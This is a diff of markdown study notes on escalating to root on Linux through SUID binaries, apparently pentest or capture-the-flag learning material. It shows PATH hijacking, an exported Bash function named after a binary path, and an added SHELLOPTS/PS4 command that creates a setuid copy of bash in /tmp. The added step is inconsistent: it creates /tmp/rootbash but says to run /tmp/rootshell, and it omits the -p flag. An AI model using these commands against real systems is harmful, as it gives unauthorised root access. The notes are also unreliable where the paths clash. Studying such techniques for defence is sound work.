@@ -30,7 +30,7 @@ Some binaries could have readable sequences of characters and they can be exploi
   - In the end, we have to tell the binary "I want you to look for `service` in my own path first, then in the others", so `PATH=.:$PATH <BINARY PATH>`:
     - `.` => our current directory.
     - `:$PATH` => join the original path.
-  - Now, running the binary we should be able to gain access to a root. shell. Check it with `whoami`.
+  - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
 
 ## Environment variables with full paths and vulnerable shell
 Check the shell version, for example with `/bin/bash --version` (if the shell is Bash). If the version is below 4.2-048, it's vulnerable and we can exploit shell functions with names that resemble file paths.
@@ -38,7 +38,16 @@ Check the shell version, for example with `/bin/bash --version` (if the shell is
 - So let's create a custom function that executes bash code:
   - `function /usr/sbin/service { /bin/bash -p; }` to run a root shell
   - `export -f /usr/sbin/service`
-- Now, running the binary we should be able to gain access to a root. shell. Check it with `whoami`.
+- Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
+
+If the shell version is above that one, anyway it will read `SHELLOPTS` and `PS4` variables before removing the SUID privileges (known bug). So we can exploit it with:
+  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <BINARY PATH>` in which:
+    - `env -i` executes a program in an empty environment, without inheriting any variables.
+    - `SHELLOPTS=xtrace` turns on the debug mode.
+    - `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'` sets a debugging prompt, that will be printed before each command.
+      - It copies Bash in the `/tmp` directory and gives it execution permissions with UID = 0 (root)
+- Now, running the shell with `/tmp/rootshell`, we should be able to gain access to a root shell. Check it with `whoami`.     
+
 
 
 
